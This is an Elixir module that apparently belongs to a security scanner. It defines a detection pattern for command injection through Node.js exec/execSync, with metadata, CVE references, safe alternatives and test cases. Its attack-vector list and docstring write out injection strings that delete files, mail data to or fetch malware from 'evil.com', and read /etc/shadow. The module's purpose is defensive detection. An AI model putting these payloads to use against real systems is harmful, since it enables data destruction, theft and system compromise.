defmodule Rsolv.Security.Patterns.Javascript.CommandInjectionExec do
  @moduledoc """
  Command Injection via child_process.exec in JavaScript/Node.js
  
  Detects dangerous patterns like:
    exec("ls " + userInput)
    execSync(`git clone ${repoUrl}`)
    child_process.exec("rm -rf " + directory)
    
  Safe alternatives:
    execFile("ls", [userInput])
    spawn("git", ["clone", repoUrl])
    execFile("rm", ["-rf", directory], {cwd: "/safe/path"})
    
  The exec() function spawns a shell and executes commands within that shell,
  passing any user input directly to the shell interpreter. This makes it
  extremely vulnerable to command injection attacks.
  
  ## Vulnerability Details
  
  The child_process.exec() method in Node.js spawns a shell (sh on Unix, cmd.exe
  on Windows) and executes the command within that shell. Any shell metacharacters
  in the input are interpreted by the shell, allowing attackers to chain commands,
  redirect output, or execute arbitrary programs.
  
  ### Attack Example
  ```javascript
  // Vulnerable code
  const fileName = req.params.file; // User provides: "file.txt; rm -rf /"
  exec("cat " + fileName, (err, stdout) => {
    res.send(stdout);
  });
  // Executes: cat file.txt; rm -rf /
  ```
  """
  
  use Rsolv.Security.Patterns.PatternBase
  alias Rsolv.Security.Pattern
  
  @doc """
  Structured vulnerability metadata for command injection via exec.
  
  This metadata documents the specific risks of using child_process.exec()
  with user input, including shell metacharacter injection and OS differences.
  """
  def vulnerability_metadata do
    %{
      description: """
      Command injection via child_process.exec() occurs when user input is passed 
      directly to the exec() or execSync() functions without proper sanitization. 
      These functions spawn a shell to execute commands, interpreting shell metacharacters 
      like ;, |, &, $, `, and others. Attackers can inject additional commands by 
      including these metacharacters in their input, leading to arbitrary command 
      execution with the privileges of the Node.js process. This is one of the most 
      severe vulnerabilities as it can lead to complete system compromise.
      """,
      
      references: [
        %{
          type: :cwe,
          id: "CWE-78",
          url: "https://cwe.mitre.org/data/definitions/78.html",
          title: "Improper Neutralization of Special Elements used in an OS Command"
        },
        %{
          type: :owasp,
          id: "A03:2021",
          url: "https://owasp.org/Top10/A03_2021-Injection/",
          title: "OWASP Top 10 2021 - A03 Injection"
        },
        %{
          type: :nodejs,
          id: "child_process_security",
          url: "https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback",
          title: "Node.js Documentation - Security Considerations"
        },
        %{
          type: :research,
          id: "command_injection_node",
          url: "https://www.stackhawk.com/blog/nodejs-command-injection-examples-and-prevention/",
          title: "NodeJS Command Injection: Examples and Prevention"
        },
        %{
          type: :npm_advisory,
          id: "eslint_security",
          url: "https://github.com/eslint-community/eslint-plugin-security/blob/main/docs/avoid-command-injection-node.md",
          title: "ESLint Security Plugin - Avoid Command Injection"
        }
      ],
      
      attack_vectors: [
        "Command chaining: userInput = 'file.txt; rm -rf /'",
        "Command substitution: userInput = '$(whoami)'",
        "Pipe injection: userInput = 'file.txt | mail attacker@evil.com'",
        "Background execution: userInput = 'file.txt & wget evil.com/malware.sh'",
        "Redirection: userInput = 'file.txt > /etc/passwd'",
        "Backtick substitution: userInput = '`cat /etc/shadow`'",
        "Environment variable: userInput = '$PATH'",
        "Newline injection: userInput = 'file.txt\\nrm -rf /'"
      ],
      
      real_world_impact: [
        "Remote code execution with application privileges",
        "Data exfiltration via command output or network tools",
        "System compromise through reverse shells",
        "Denial of service by resource exhaustion",
        "Privilege escalation if app runs with elevated permissions",
        "Lateral movement in containerized environments",
        "Cryptocurrency mining through injected scripts",
        "Ransomware deployment in production systems"
      ],
      
      cve_examples: [
        %{
          id: "CVE-2024-21488",
          description: "Command injection in network npm package via child_process.exec",
          severity: "critical",
          cvss: 9.8,
          note: "Arbitrary command execution through unsanitized exec() calls"
        },
        %{
          id: "CVE-2021-21315",
          description: "Command injection in systeminformation npm package",
          severity: "high",
          cvss: 7.8,
          note: "OS command injection through exec() without input validation"
        },
        %{
          id: "CVE-2018-21268",
          description: "Command injection in node-traceroute package",
          severity: "critical",
          cvss: 9.8,
          note: "Remote command injection via host parameter passed to exec()"
        },
        %{
          id: "CVE-2017-1000451",
          description: "Command injection in fs-git module",
          severity: "critical",
          cvss: 9.8,
          note: "Unsanitized input passed to child_process.exec for git operations"
        }
      ],
      
      detection_notes: """
      This pattern detects calls to exec() or execSync() where user input appears
      to be concatenated or interpolated into the command string. Key indicators:
      1. Direct calls to exec or execSync functions
      2. String concatenation (+) or template literal interpolation (${})
      3. Common user input patterns (req.params, req.body, etc.)
      4. Variable names suggesting external input
      
      The pattern must distinguish between safe static commands and those
      constructed with user input.
      """,
      
      safe_alternatives: [
        "Use execFile() with arguments array: execFile('ls', [userInput])",
        "Use spawn() without shell option: spawn('git', ['clone', url])",
        "Validate input against allowlist before any command execution",
        "Use dedicated libraries instead of shell commands when possible",
        "Implement proper input sanitization with shell-escape libraries",
        "Run commands in sandboxed environments or containers",
        "Use execFileSync() for synchronous needs instead of execSync()"
      ],
      
      additional_context: %{
        shell_differences: [
          "Unix/Linux: Uses /bin/sh, interprets POSIX shell metacharacters",
          "Windows: Uses cmd.exe, different metacharacters like ^ and %",
          "PowerShell: If configured, introduces additional injection vectors",
          "Docker containers: May have limited shells but still vulnerable"
        ],
        
        common_mistakes: [
          "Believing that escaping quotes is sufficient protection",
          "Assuming certain characters are 'safe' (they're not)",
          "Using exec() for simple commands that don't need a shell",
          "Not considering newline characters as command separators",
          "Trusting data from 'internal' sources without validation"
        ],
        
        secure_patterns: [
          "Always use execFile() or spawn() when possible",
          "If shell features needed, use spawn() with explicit shell array",
          "Implement strict input validation with allowlists",
          "Use -- to separate options from arguments where supported",
          "Consider using worker threads instead of child processes"
        ]
      }
    }
  end
  
  @doc """
  Returns the pattern definition for command injection via exec.
  
  ## Examples
  
      iex> pattern = Rsolv.Security.Patterns.Javascript.CommandInjectionExec.pattern()
      iex> pattern.id
      "js-command-injection-exec"
      iex> pattern.severity
      :critical
  """
  def pattern do
    %Pattern{
      id: "js-command-injection-exec",
      name: "Command Injection via exec",
      description: "Using exec with user input can lead to command injection",
      type: :command_injection,
      severity: :critical,
      languages: ["javascript", "typescript"],
      # Matches exec/execSync with concatenation or interpolation
      regex: ~r/(?:exec|execSync)\s*\([^)]*(?:\+|\$\{)[^)]*[a-zA-Z]/,
      cwe_id: "CWE-78",
      owasp_category: "A03:2021",
      recommendation: "Use execFile with argument array instead of exec. Validate and sanitize all user input.",
      test_cases: %{
        vulnerable: [
          ~S|exec("ls " + userInput)|,
          ~S|execSync(`git clone ${repoUrl}`)|,
          ~S|exec("cat /tmp/" + req.params.file)|,
          ~S|child_process.exec("rm -rf " + directory)|,
          ~S|exec('echo ' + userData + ' > output.txt')|
        ],
        safe: [
          ~S|execFile("ls", [userInput])|,
          ~S|spawn("git", ["clone", repoUrl])|,
          ~S|execFile("cat", ["/tmp/safe.txt"])|,
          ~S|execFile("rm", ["-rf", directory], {cwd: "/safe/path"})|
        ]
      }
    }
  end
  
  @doc """
  Check if this pattern applies to a file based on its path and content.
  
  Applies to JavaScript/TypeScript files that might use child_process.
  """
  def applies_to_file?(file_path, content ) do
    cond do
      # JavaScript/TypeScript files
      String.match?(file_path, ~r/\.(js|jsx|ts|tsx)$/i) -> true
      
      # HTML files with script tags
      String.match?(file_path, ~r/\.html?$/i) && content != nil ->
        String.contains?(content, "<script")
        
      # Default
      true -> false
    end
  end
  
  @doc """
  Returns AST enhancement rules to reduce false positives.
  
  This enhancement helps distinguish between actual command injection vulnerabilities and:
  - Static commands with no user input
  - Test/script files that might use exec for automation
  - Safe usage patterns like execFile or spawn with arrays
  - Commands that are properly validated or use safe patterns
  
  ## Examples
  
      iex> enhancement = Rsolv.Security.Patterns.Javascript.CommandInjectionExec.ast_enhancement()
      iex> Map.keys(enhancement) |> Enum.sort()
      [:ast_rules, :confidence_rules, :context_rules, :min_confidence]
      
      iex> enhancement = Rsolv.Security.Patterns.Javascript.CommandInjectionExec.ast_enhancement()
      iex> enhancement.ast_rules.node_type
      "CallExpression"
      
      iex> enhancement = Rsolv.Security.Patterns.Javascript.CommandInjectionExec.ast_enhancement()
      iex> enhancement.ast_rules.callee_names
      ["exec", "execSync"]
      
      iex> enhancement = Rsolv.Security.Patterns.Javascript.CommandInjectionExec.ast_enhancement()
      iex> enhancement.min_confidence
      0.8
      
      iex> enhancement = Rsolv.Security.Patterns.Javascript.CommandInjectionExec.ast_enhancement()
      iex> "uses_array_args" in Map.keys(enhancement.confidence_rules.adjustments)
      true
  """
  @impl true
  def ast_enhancement do
    %{
      ast_rules: %{
        node_type: "CallExpression",
        callee_names: ["exec", "execSync"],
        # Must have string concatenation or template literals with variables
        argument_analysis: %{
          has_string_concatenation: true,
          has_template_literal_with_variables: true,
          not_using_array_arguments: true
        }
      },
      context_rules: %{
        exclude_paths: [~r/test/, ~r/spec/, ~r/__tests__/, ~r/node_modules/, ~r/scripts/],
        exclude_if_static_command: true,  # Skip if no dynamic content
        require_user_input_source: true   # Must trace back to user input
      },
      confidence_rules: %{
        base: 0.4,
        adjustments: %{
          "has_user_input" => 0.3,
          "uses_string_concatenation" => 0.2,
          "no_input_validation" => 0.2,
          "is_static_command" => -0.9,
          "uses_array_args" => -0.7  # Safe pattern
        }
      },
      min_confidence: 0.8
    }
  end
end
